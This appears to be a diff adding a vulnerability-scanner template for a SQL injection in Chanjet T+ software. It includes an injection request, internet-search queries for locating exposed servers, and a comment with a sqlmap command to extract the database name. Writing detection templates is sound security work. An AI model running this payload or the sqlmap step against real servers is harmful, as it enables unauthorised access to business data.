@@ -1,0 +1,28 @@
+id: changjet-tplus-getsendactionbymenu-sqli
+
+info:
+  name: changjet tplus - SQL Injection
+  author: hufei
+  severity: high
+  description: There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+    hunter-query: app.name="畅捷通 T+"
+  tags: changjet,sqli,yonyou,tplus
+
+http:
+  - raw:
+      - |
+        GET /tplus/tapi/v1/DevVouMsgSetApi/getSendActionByMenu?dsName=UFTData160658_000001&menuCode=ARAP01' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "附近有语法错误"
+# 漏洞功能点在后台，需要在实施工具有二开消息订阅模块
+# python sqlmap.py -r hytec-Inter.txt --current-db --batch
